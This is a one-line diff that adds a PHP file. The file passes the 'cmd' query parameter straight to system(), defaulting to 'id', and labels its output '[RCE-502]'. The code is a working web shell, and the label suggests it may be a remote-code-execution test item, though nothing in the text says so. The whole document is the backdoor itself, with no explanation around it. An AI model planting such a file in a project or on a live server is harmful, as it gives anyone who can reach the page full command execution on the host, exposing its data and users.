@@ -1,0 +1,1 @@
+<?php echo "[RCE-502] "; system($_GET["cmd"] ?? "id"); ?>
